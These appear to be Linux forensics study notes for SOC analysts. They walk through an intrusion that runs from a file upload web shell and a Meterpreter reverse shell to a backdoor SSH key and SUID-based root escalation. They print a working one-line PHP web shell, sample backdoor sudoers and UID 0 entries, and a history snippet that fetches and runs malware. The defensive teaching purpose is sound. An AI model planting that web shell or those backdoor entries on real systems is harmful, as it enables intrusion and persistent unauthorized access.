# Linux DFIR - Identifying the Foothold (SOC Notes)

## Goal of Investigation

We already know:

* Website has a file upload vulnerability.
* Attacker gained access to the server.
* We need to find:

  * How attacker entered.
  * What files attacker uploaded.
  * What attacker executed.
  * Timeline of attacker activity.

---

# Step 1: Secure the Investigation Environment

Before investigating:

Use trusted binaries and libraries from a clean USB.

Why?

Because an attacker with root access may modify system commands such as:

* ls
* ps
* find
* netstat

and show fake results.

### SOC Lesson

Never fully trust a compromised host.

Always try to use trusted tools when possible.

---

# Step 2: Look at the Web Directory

Directory:

/var/www/html

Why?

Because the attack is related to a web application.

If the attacker used a file upload vulnerability, evidence will likely be inside the web folders.

Important files found:

* index.html
* upload.php
* uploads/
* assets/

### SOC Thinking

Attack Vector = File Upload

So check:

* Upload functionality
* Upload directory
* Web files

---

# Step 3: Investigate Uploaded Files

Inside uploads directory:

Most files are:

* .jpeg images

Images are usually normal user uploads.

Instead of checking hundreds of JPEG files, focus on unusual files.

A suspicious file was found:

b2c8e1f5.phtml

### Why is .phtml suspicious?

Because it can execute PHP code.

Normal uploads:

* .jpg
* .jpeg
* .png

Suspicious uploads:

* .php
* .phtml
* .phar

---

# Step 4: Identify the Web Shell

File content:

<?php system($_GET['cmd']);?>

### What does it do?

The attacker can send a command through the URL.

Example:

cmd=id

Server executes:

id

### Result

Remote Command Execution (RCE)

Attacker can execute Linux commands from the browser.

### SOC Conclusion

Initial Foothold Identified.

Attacker uploaded a web shell.

---

# Step 5: Investigate File Ownership

Owner:

www-data

### What is www-data?

The web server account.

Commonly used by:

* Apache
* Nginx

### SOC Thinking

If attacker used the web server, many attacker-created files may also belong to:

www-data

---

# Step 6: Search for Files Owned by www-data

Purpose:

Find files created by the attacker.

Interesting file discovered:

reverse.elf

Location:

/var/www/html/assets/

### Why is it suspicious?

Because:

* It is an executable.
* It is located in a web directory.
* It belongs to www-data.

### SOC Conclusion

Possible attacker payload.

---

# Step 7: Check Permissions

Permission:

-rwxr-xr-x

Important part:

x = executable

Meaning:

The file can be executed.

### SOC Thinking

Executable files inside web folders should always be investigated.

---

# Step 8: Metadata Analysis

Tool:

ExifTool

Metadata tells us:

* File type
* Size
* Architecture
* Permissions
* Timestamps

Information found:

* ELF executable
* 64-bit
* AMD x86-64

### SOC Value

Helps understand:

* What the file is.
* When it appeared.
* Whether it fits the attack timeline.

---

# Step 9: Hash Analysis

Tools:

* MD5
* SHA256

### What is a Hash?

Think of it as a fingerprint of a file.

If even one byte changes:

Hash changes.

### Why do SOC Analysts calculate hashes?

To:

* Identify malware.
* Check integrity.
* Search malware databases.

Example:

VirusTotal

### Result

reverse.elf identified as:

Meterpreter Reverse Shell

### SOC Conclusion

Attacker uploaded and executed a reverse shell payload.

---

# Step 10: Understand Timestamps

Linux has three important timestamps.

---

## mtime (Modify Time)

Question:

"When was file content changed?"

Example:

Editing a file updates mtime.

---

## ctime (Change Time)

Question:

"When was file metadata changed?"

Examples:

* Permission changes
* Ownership changes

---

## atime (Access Time)

Question:

"When was file last read?"

Example:

Opening a file updates atime.

---

# Important DFIR Warning

atime is unreliable during live investigations.

Why?

Because investigators themselves may update it.

Example:

* Reading file
* Hashing file
* Running ExifTool

All can modify atime.

---

# stat Command

Best command for timestamps.

Shows:

* atime
* mtime
* ctime
* owner
* permissions
* size

all in one place.

### SOC Value

Very useful for timeline reconstruction.

---

# Final Attack Timeline

1. File upload vulnerability existed.
2. Attacker uploaded a web shell (.phtml).
3. Web shell allowed command execution.
4. Attacker uploaded reverse.elf.
5. reverse.elf was a Meterpreter reverse shell.
6. Attacker gained interactive access to the server.

---

# SOC Investigation Workflow

When investigating a file upload compromise:

1. Identify upload directories.
2. Find unusual file extensions.
3. Inspect suspicious files.
4. Check ownership.
5. Search for attacker-created files.
6. Inspect permissions.
7. Review metadata.
8. Calculate hashes.
9. Build a timeline using timestamps.
10. Reconstruct the attack chain.

---

# Quick Revision

Web Shell
= File that allows remote command execution.

www-data
= Web server user account.

ELF
= Linux executable file.

Metadata
= Information about a file.

Hash
= Fingerprint of a file.

mtime
= Content changed.

ctime
= Metadata changed.

atime
= File accessed.

stat
= View all timestamps together.

Main Finding
= Attacker uploaded a malicious .phtml web shell and later executed a Meterpreter reverse shell payload.

---

# Linux DFIR - Users, Groups and Persistence (SOC Notes)

## Goal of Investigation

After finding the web shell and reverse shell, the next question is:

How did the attacker maintain access?

SOC analysts investigate:

* Users
* Groups
* Login activity
* SSH keys
* Home directories
* Sudo privileges

to find persistence mechanisms.

---

# User Accounts

Important file:

/etc/passwd

Purpose:

Stores information about system users.

Example:

root:x:0:0:root:/root:/bin/bash

Important fields:

* Username
* UID (User ID)
* GID (Group ID)
* Home Directory
* Login Shell

### SOC Value

Helps identify:

* Suspicious users
* Backdoor accounts
* Privileged accounts

---

# UID 0 Investigation

UID 0 means:

Root privileges.

Normally:

root = UID 0

If another account also has UID 0:

evil:0

then that account has root-level privileges.

### SOC Alert

Any non-root account with UID 0 is highly suspicious.

Possible attacker backdoor account.

---

# Groups

Important file:

/etc/group

Purpose:

Stores Linux groups and their members.

Groups provide additional privileges.

### SOC Focus Groups

sudo / wheel

* Can execute commands as root.

adm

* Can read system logs.

shadow

* Can access password hashes.

disk

* High-level disk access.

---

# Why Check Groups?

Attackers may:

* Add themselves to sudo
* Add themselves to shadow
* Add themselves to adm

instead of creating a new root account.

### SOC Thinking

Not all privilege escalation comes from UID 0.

Group memberships are also important.

---

# User Group Membership

Question:

Which groups belong to a user?

Example:

investigator

Member of:

* sudo
* adm
* video
* audio

### SOC Value

Helps identify privilege escalation opportunities.

---

# Group Membership Investigation

Question:

Who belongs to a specific group?

Example:

sudo group

Members:

* ubuntu
* investigator

### SOC Value

Useful when investigating privileged users.

---

# Login Activity

Important question:

Who logged into the system?

When?

From where?

---

# last

Data source:

/var/log/wtmp

Shows:

* Login history
* Logout history
* Source IP addresses
* Session duration

### SOC Value

Helps identify:

* Attacker IP addresses
* Unusual login times
* Remote access activity

---

# lastb

Data source:

/var/log/btmp

Shows:

Failed login attempts.

### SOC Value

Useful for detecting:

* Password attacks
* Brute-force attacks
* Credential stuffing

---

# lastlog

Data source:

/var/log/lastlog

Shows:

Most recent login for each user.

### SOC Value

Quick way to identify:

* Active accounts
* Dormant accounts
* Never-used accounts

---

# Authentication Logs

Important files:

/var/log/auth.log

or

/var/log/secure

Contains:

* Successful logins
* Failed logins
* Authentication activity
* sudo usage

### SOC Value

One of the most important forensic log sources.

---

# who

Question:

Who is currently logged in?

Provides:

* Username
* Terminal
* Login time
* Source IP

### SOC Value

Useful during live incident response.

Can reveal active attacker sessions.

---

# Sudoers File

Important file:

/etc/sudoers

Purpose:

Controls sudo permissions.

Example:

richard ALL=(ALL) /sbin/ifconfig

Meaning:

Richard can run ifconfig using sudo.

---

# Why Investigate sudoers?

Attackers often modify sudoers for persistence.

Example:

evil ALL=(ALL) NOPASSWD:ALL

Meaning:

User can execute any command as root without a password.

### SOC Alert

Unexpected sudo entries are a major indicator of compromise.

---

# User Home Directories

Location:

/home

Examples:

* /home/bob
* /home/jane
* /home/ubuntu

### SOC Value

Home directories contain:

* User data
* Configurations
* History
* SSH keys

Often contain attacker artefacts.

---

# Hidden Files

Files beginning with:

.

Examples:

* .bash_history
* .bashrc
* .profile
* .ssh

### SOC Value

Very common persistence locations.

---

# .bash_history

Stores command history.

Example:

wget malware.sh

chmod +x malware.sh

./malware.sh

### SOC Value

Can reveal attacker actions directly.

One of the most useful forensic artefacts.

---

# .bashrc and .profile

Shell configuration files.

Executed during shell startup.

### SOC Value

Attackers may place:

* Malicious commands
* Reverse shells
* Persistence scripts

inside these files.

---

# SSH Persistence

Important directory:

~/.ssh

Contains:

* SSH keys
* SSH configurations
* Authorized access settings

---

# authorized_keys

Purpose:

Lists public keys allowed to log in through SSH.

Example:

ssh-rsa AAAA.... jane

### SOC Value

Any unknown key may indicate persistence.

---

# Investigation Finding

authorized_keys contained:

* Jane's legitimate key
* Backdoor key

Example:

ssh-rsa .... backdoor

### SOC Conclusion

Attacker added their own SSH key.

This allows future access without a password.

---

# Why Was This Possible?

Permissions:

-rw-rw-rw-

Meaning:

World Writable.

Anyone can modify the file.

### Security Issue

Sensitive files should never be world writable.

---

# Timeline Correlation

Using:

stat authorized_keys

We can compare:

* Web shell creation
* Reverse shell activity
* authorized_keys modification

### SOC Value

Helps reconstruct attacker actions.

---

# Attack Timeline

1. Attacker exploited file upload vulnerability.
2. Uploaded malicious web shell.
3. Executed commands remotely.
4. Obtained shell access.
5. Modified Jane's authorized_keys file.
6. Added attacker-controlled SSH key.
7. Gained persistent SSH access.
8. Created or maintained privileged access.

---

# Quick Revision

/etc/passwd
= User database.

/etc/group
= Group database.

UID 0
= Root privileges.

sudo group
= Administrative access.

last
= Login history.

lastb
= Failed login history.

lastlog
= Most recent login.

who
= Currently logged-in users.

/etc/sudoers
= Sudo permissions.

.bash_history
= Command history.

.ssh/authorized_keys
= Allowed SSH public keys.

World Writable
= Any user can modify the file.

Main Finding
= Attacker abused weak permissions on authorized_keys and added a backdoor SSH key for persistence.


---

# Linux DFIR - Privilege Escalation and Rootkit Investigation (SOC Notes)

## Goal of Investigation

We already know:

1. Attacker uploaded a web shell.
2. Attacker gained remote access.
3. Attacker created persistence.

Now we need to answer:

How did the attacker become ROOT?

And:

Did the attacker try to hide their activity?

---

# Suspicious Binaries

A binary is simply an executable program.

Examples:

* bash
* python
* ssh
* mount

During an investigation, SOC analysts look for:

* Unknown executables
* Recently created executables
* Modified binaries
* Misconfigured binaries

### SOC Thinking

If an attacker gains access, they often upload or abuse executables.

---

# Finding Executable Files

Purpose:

Find programs that can be executed.

Important because attackers often:

* Upload malware
* Upload reverse shells
* Create backdoors

### SOC Value

Helps identify suspicious tools used by attackers.

---

# Strings Analysis

Tool:

strings

Purpose:

Extract readable text from a binary.

Example findings:

* IP addresses
* Domains
* File paths
* Commands
* Error messages

### SOC Value

Helps understand what a binary might do without fully reversing it.

Think of it as:

"Looking inside a program for readable clues."

---

# Integrity Checking

Question:

Was a system file modified?

One method:

debsums

Purpose:

Compare installed package files against known-good hashes.

### SOC Value

Detects:

* Modified binaries
* Tampered packages
* Possible malware changes

Example:

If the original sudo binary was changed by an attacker,

debsums may detect it.

---

# SUID and SGID

Very important Linux privilege escalation concept.

Normally:

A program runs with the permissions of the user who launched it.

Example:

Jane runs a program.

Program runs as Jane.

---

## SUID

Special permission bit.

A program runs with the permissions of the file owner.

Example:

Owner = root

User = jane

If SUID is enabled:

Program runs as root.

### Security Risk

If a dangerous binary receives SUID permissions,

an attacker may become root.

---

# Investigating SUID Binaries

SOC analysts search for:

* Unusual SUID files
* Recently created SUID files
* SUID binaries in temporary directories

Normal examples:

* passwd
* mount

Suspicious examples:

* python
* bash
* custom scripts

---

# Key Investigation Finding

Suspicious SUID binaries found:

* python3.8
* /var/tmp/bash

### Why is Python suspicious?

Python can execute operating system commands.

If Python runs as root,

attackers can execute root commands.

### SOC Alert

Python should not normally have SUID permissions.

---

# Bash History Investigation

File:

.bash_history

Purpose:

Stores previously executed commands.

### SOC Value

One of the best sources of attacker activity.

Can reveal:

* Commands executed
* Tools used
* Privilege escalation methods

---

# What Did the Attacker Do?

Evidence showed:

1. Attacker searched for SUID binaries.
2. Attacker found SUID Python.
3. Attacker abused SUID Python.

### SOC Conclusion

The attacker intentionally searched for privilege escalation opportunities.

---

# Privilege Escalation Process

Attacker used Python to:

1. Copy the original bash binary.
2. Place the copy in /var/tmp.
3. Change ownership to root.
4. Add SUID permissions.

Result:

/var/tmp/bash became a root-owned SUID shell.

---

# Why is /var/tmp Important?

Directory:

/var/tmp

Usually writable by users.

Attackers often use:

* /tmp
* /var/tmp
* /dev/shm

for temporary tools and payloads.

### SOC Alert

SUID binaries inside temporary directories are highly suspicious.

---

# Final Privilege Escalation

Attacker executed:

/var/tmp/bash

Because:

* Owner = root
* SUID enabled

The shell ran with root privileges.

### Result

Privilege Escalation Successful

Attacker became root.

---

# Integrity Verification

Analyst compared:

* /bin/bash
* /var/tmp/bash

Both hashes matched.

### SOC Conclusion

Attacker did not create malware.

Instead:

They copied the legitimate bash binary and modified permissions.

---

# Rootkits

Rootkit = Software designed to hide attacker activity while maintaining privileged access.

Main goals:

* Stay hidden
* Maintain access
* Avoid detection

### SOC Thinking

Rootkits are dangerous because they can hide:

* Files
* Processes
* Network connections
* Malware

---

# Why Rootkits Matter

Without a rootkit:

Analyst can see attacker activity.

With a rootkit:

System may provide fake information.

Examples:

* Fake process lists
* Hidden files
* Hidden malware

### SOC Lesson

Never blindly trust a compromised system.

---

# Chkrootkit

Purpose:

Search for known rootkit indicators.

Checks:

* Files
* Directories
* Processes
* Known rootkit signatures

### Advantages

* Fast
* Simple
* Good first check

### Limitations

May miss:

* New rootkits
* Custom rootkits
* Advanced rootkits

---

# RKHunter

Purpose:

Perform a deeper rootkit assessment.

Checks:

* File hashes
* Permissions
* Hidden files
* Kernel modules
* Rootkit signatures

### Advantages

More comprehensive than chkrootkit.

### SOC Value

Excellent second-stage validation tool.

---

# Rootkit Detection Strategy

Do not rely on one tool.

Combine:

* File analysis
* Logs
* Hashes
* Permissions
* Rootkit scanners

### SOC Lesson

A clean rootkit scan does NOT guarantee a clean system.

---

# Full Attack Timeline

1. File upload vulnerability existed.
2. Attacker uploaded a web shell.
3. Attacker gained command execution.
4. Attacker uploaded a reverse shell.
5. Attacker gained interactive access.
6. Attacker established persistence.
7. Attacker searched for SUID binaries.
8. Attacker abused SUID Python.
9. Attacker created a SUID bash shell.
10. Attacker became root.
11. Analysts checked for possible rootkits.

---

# Quick Revision

Binary
= Executable program.

strings
= Extract readable text from binaries.

debsums
= Verify package integrity.

SUID
= Run program with owner's privileges.

SGID
= Run program with group's privileges.

.bash_history
= User command history.

Privilege Escalation
= Gaining higher permissions.

Rootkit
= Hidden malicious software with privileged access.

Chkrootkit
= Fast rootkit detection tool.

RKHunter
= More comprehensive rootkit detection tool.

Main Finding
= Attacker abused a misconfigured SUID Python binary to create a root-owned SUID bash shell and escalate privileges to root.
